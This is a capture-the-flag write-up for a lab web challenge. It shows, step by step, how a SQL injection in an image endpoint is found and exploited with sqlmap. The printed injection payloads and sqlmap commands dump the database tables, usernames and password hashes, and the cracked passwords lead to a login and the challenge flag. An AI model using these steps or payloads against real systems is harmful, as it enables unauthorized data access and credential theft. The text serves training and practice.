## Navigation plan

Points: 3

Inspection of the page tells us that there is a `/system/login` endpoint and a suspicious `/image.png?type=data&t=targets&id=1` endpoint.
Playing with it for a while hints at SQLi vulnerability, so let's feed it to sqlmap: `sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1"`
and indeed it is vulnerable endpoint with MySQL >= 5.0 database and PHP 8.2.10 on Apache:
```
...
GET parameter 'type' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 1026 HTTP(s) requests:
---
Parameter: type (GET)
    Type: boolean-based blind
    Title: MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause
    Payload: type=data,(SELECT (CASE WHEN (6698=6698) THEN 1 ELSE 6698*(SELECT 6698 FROM INFORMATION_SCHEMA.PLUGINS) END))&t=targets&id=1

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: type=data OR (SELECT 3574 FROM(SELECT COUNT(*),CONCAT(0x7176627171,(SELECT (ELT(3574=3574,1))),0x7170626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&t=targets&id=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: type=data AND (SELECT 6043 FROM (SELECT(SLEEP(5)))IYZq)&t=targets&id=1
---
...
```

Let's get the DB name: `sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" --current-db` -> `navigation`
Enumeration of tables: `sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation --tables`
->
```
[3 tables]
+---------+
| files   |
| targets |
| users   |
+---------+
```

Next I tried to fetching `TARGETS.DETAIL(S)` column but apparently there isn't any column like that and I couldn't enumerate columns of the tables. So I tried dumping the `users` and see if I can login.

`sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users -C username --dump` ->
```
Database: navigation
Table: users
[3 entries]
+----------+
| username |
+----------+
| captain  |
| engeneer |
| officer  |
+----------+
```

Dumping `password` also offered cracking which I tried, using rockyou wordlist:
`sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users -C password --dump` ->

```
Database: navigation
Table: users
[3 entries]
+-------------------------------------------------------------------------------------+
| password                                                                            |
+-------------------------------------------------------------------------------------+
| 15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225 (123456789)        |
| 6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb                    |
| 7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537 ($captainamerica$) |
+-------------------------------------------------------------------------------------+
```

Then I tried logging - `engineer/123456789` worked but that's a deactivated account. `captain/$captainamerica$` logged me in and I could read as that and clicking on Details for Target #4:

`FLAG{fmIT-QkuR-FFUv-Zx44}`
